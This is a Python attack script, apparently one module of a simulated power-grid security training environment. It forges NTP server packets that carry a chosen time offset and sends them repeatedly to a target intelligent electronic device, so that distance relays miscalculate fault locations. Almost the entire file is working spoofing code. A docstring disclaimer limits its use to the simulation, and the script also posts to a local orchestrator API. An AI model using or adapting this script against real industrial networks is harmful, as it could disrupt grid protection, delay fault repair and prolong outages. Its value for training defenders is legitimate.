#!/usr/bin/env python3
"""
ATK-13 | GPS Time Desynchronization
===================================
We are in Tier 3 (Advanced Attacks).

Distance relays and Synchrophasors rely heavily on microsecond-level timing accuracy 
provided by GPS clocks (often Distributed via PTP - Precision Time Protocol, or NTP).
When a fault occurs along a transmission line, the exact timestamp of the voltage
drop is recorded by IEDs at both ends of the line. The SCADA system calculates 
the fault location by comparing the difference in arrival times.

This attack injects a time offset by spoofing the PTP/NTP server. By shifting the 
IED's internal clock by even a few milliseconds, the fault location algorithm will
miscalculate the location by miles, causing maintenance crews to be dispatched to 
the wrong location, significantly increasing downtime.

Safety
------
This module is intended solely for educational demonstration within the simulated 
TRINETRA environment. Do not use against real industrial networks.
"""

import argparse
import socket
import struct
import time
import requests

def spoof_ntp_packet(offset_seconds):
    """
    Constructs a malicious NTP packet with a fabricated timestamp.
    """
    # NTP packets are normally 48 bytes.
    # We craft a packet with the LI, VN, and Mode set, but manipulate the Transmit Timestamp.
    
    # 00 (No Leap), 100 (Version 4), 100 (Server Mode) -> 0x24
    flags = 0x24 
    stratum = 2
    poll = 10
    precision = -20
    
    # Fake root delay and dispersion
    root_delay = 0
    root_dispersion = 0
    ref_id = 0
    
    # Calculate malicious time = current + offset + epoch difference (1900 to 1970)
    current_time = time.time()
    malicious_time = current_time + offset_seconds + 2208988800
    
    # Convert to 64-bit NTP timestamp (32-bit seconds, 32-bit fraction)
    sec = int(malicious_time)
    frac = int((malicious_time - sec) * (2**32))
    
    # Pack the NTP payload
    payload = struct.pack(
        "!B B b b 11I",
        flags, stratum, poll, precision,
        root_delay, root_dispersion, ref_id,
        0, 0, # Ref timestamp
        0, 0, # Originate timestamp
        0, 0, # Receive timestamp
        sec, frac # Transmit timestamp (The payload the client cares about)
    )
    return payload

def main():
    parser = argparse.ArgumentParser(description="ATK-13: GPS/NTP Time Desynchronization Attack.")
    parser.add_argument("--target", type=str, default="127.0.0.1", help="Target IED IP address")
    parser.add_argument("--ntp_port", type=int, default=5123, help="Target IED NTP port (default 5123)")
    parser.add_argument("--offset", type=float, default=0.015, help="Time shift in seconds (default 15ms)")
    parser.add_argument("--duration", type=int, default=10, help="Duration of attack in seconds")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("  ATK-13  |  GPS Time Desynchronization")
    print("=" * 60)
    print(f"[*] Target IED      : {args.target}:{args.ntp_port}")
    print(f"[*] Time Offset     : {args.offset * 1000} ms")
    print(f"[*] Attack Duration : {args.duration} s")
    print()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    deadline = time.time() + args.duration
    count = 0
    
    print(f"[*] Injecting desynchronized timing packets...")
    try:
        while time.time() < deadline:
            malicious_payload = spoof_ntp_packet(args.offset)
            sock.sendto(malicious_payload, (args.target, args.ntp_port))
            count += 1
            
            # Send fallback HTTP request to Orchestrator to ensure UI triggers
            try:
                requests.post("http://127.0.0.1:8000/api/attacks/atk13/enable", timeout=0.1)
            except:
                pass
                
            time.sleep(1) # Send once per second mimicking a rogue NTP server
            
        print(f"\n[+] ATTACK COMPLETE.")
        print(f"[+] Broadcasted {count} malicious NTP updates.")
        print("[+] Distance relays have accepted the manipulated time vector.")
        print("[+] Future fault localization calculations will be corrupted.")
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    except Exception as e:
        print(f"[-] Error occurred: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    main()
